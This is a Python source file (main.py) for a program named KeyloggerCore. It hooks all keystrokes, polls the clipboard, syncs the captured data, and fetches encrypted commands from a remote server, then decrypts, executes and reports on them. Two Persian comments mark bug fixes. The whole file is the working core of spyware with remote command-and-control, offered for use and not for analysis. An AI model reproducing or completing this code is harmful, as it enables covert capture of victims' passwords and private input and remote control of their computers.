# ------------ main.py ------------
import threading
import time
import json
import logging
import sys
from keyboard import hook, add_hotkey
from config import Config
from encryption.manager import EncryptionManager, EncryptionError
from network.communicator import ServerCommunicator, CommunicationError
from system.collector import SystemCollector
from commands.handler import CommandHandler, CommandError
from monitoring.logger import ActivityLogger

class KeyloggerCore:
    def __init__(self):
        self.client_id = Config.get_client_id()
        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption)
        self.logger = ActivityLogger(Config.BUFFER_LIMIT)
        self.running = True

    def start(self):
        self._init_hotkeys()
        self._start_service_threads()
        self._main_loop()

    def _init_hotkeys(self):
        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
        hook(self.logger.log_keystroke)

    def _start_service_threads(self):
        threading.Thread(target=self._data_sync_loop, daemon=True).start()
        threading.Thread(target=self._command_loop, daemon=True).start()
        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()

    def _data_sync_loop(self):
        while self.running:
            try:
                self.logger.flush_buffer()
                time.sleep(Config.CHECK_INTERVAL)
            except Exception as e:
                self._handle_error(f"Data sync error: {str(e)}")

    def _command_loop(self):
        while self.running:
            try:
                commands = self.communicator.fetch_commands()
                if commands:
                    self._process_commands(commands)
                time.sleep(Config.COMMAND_POLL_INTERVAL)
            except Exception as e:
                self._handle_error(f"Command processing error: {str(e)}")

    def _clipboard_monitor_loop(self):
        while self.running:
            try:
                self.logger.log_clipboard()
                time.sleep(10)
            except Exception as e:
                self._handle_error(f"Clipboard monitor error: {str(e)}")

    def _process_commands(self, commands):
        for cmd in commands:
            try:
                decrypted = self.encryption.decrypt(cmd['command'])
                result = CommandHandler.execute(  # خطای اصلی اینجا رفع شد
                    cmd['type'],
                    json.loads(decrypted)
                )  # پرانتز بسته اضافه شد
                self.communicator.send_command_result(cmd['id'], result)
            except (EncryptionError, CommandError, json.JSONDecodeError) as e:
                self._handle_error(f"Command execution failed: {str(e)}")

    def _handle_error(self, message):
        logging.error(message)

    def emergency_stop(self):
        self.running = False
        logging.info("Emergency stop activated")
        sys.exit(0)

    def _main_loop(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.emergency_stop()

if __name__ == "__main__":
    keylogger = KeyloggerCore()
    keylogger.start()